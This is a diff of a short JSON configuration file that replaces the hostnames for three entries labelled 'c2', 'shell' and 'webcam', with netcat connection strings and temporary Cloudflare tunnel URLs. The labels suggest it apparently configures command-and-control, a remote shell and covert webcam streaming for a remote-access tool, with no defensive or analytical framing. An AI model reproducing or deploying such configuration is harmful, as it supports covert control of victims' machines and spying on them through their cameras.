@@ -1,18 +1,18 @@
 {
   "c2": {
-    "host": "sb-snap-show-retain",
+    "host": "bryan-buyer-shut-cir",
     "port": "",
     "type": "tcp",
-    "connection_string": "nc sb-snap-show-retain:"
+    "connection_string": "nc bryan-buyer-shut-cir:"
   },
   "shell": {
-    "host": "locked-announces-seeing-she",
+    "host": "anthony-cds-casio-collect",
     "port": "",
     "type": "tcp",
-    "connection_string": "nc locked-announces-seeing-she:"
+    "connection_string": "nc anthony-cds-casio-collect:"
   },
   "webcam": {
-    "url": "https://conditional-judgment-butler-graduated.trycloudflare.com",
+    "url": "https://commodity-founder-islamic-respective.trycloudflare.com",
     "type": "http"
   }
 }
